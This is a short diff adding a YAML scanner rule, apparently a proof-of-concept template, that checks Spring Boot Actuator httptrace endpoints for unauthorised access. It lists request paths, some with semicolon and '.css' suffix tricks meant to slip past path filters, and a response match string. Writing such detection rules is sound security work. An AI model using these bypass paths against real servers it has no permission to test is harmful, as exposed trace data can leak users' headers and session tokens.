@@ -1,0 +1,17 @@
+name: Find-Actuator httptrace API 未授权访问
+rules:
+  - method: GET
+    poc: 
+        - /actuator/httptrace
+        - /jeecg-boot/actuator/httptrace
+        - /actuator;/httptrace
+        - /api/actuator;/httptrace
+        - /api/actuator/httptrace
+        - /actuator/httptrace;.css
+    body:
+        
+    check: '{"traces"'
+detail:
+  author: LittleBear4   
+  links: 
+    - https://xxxxxx
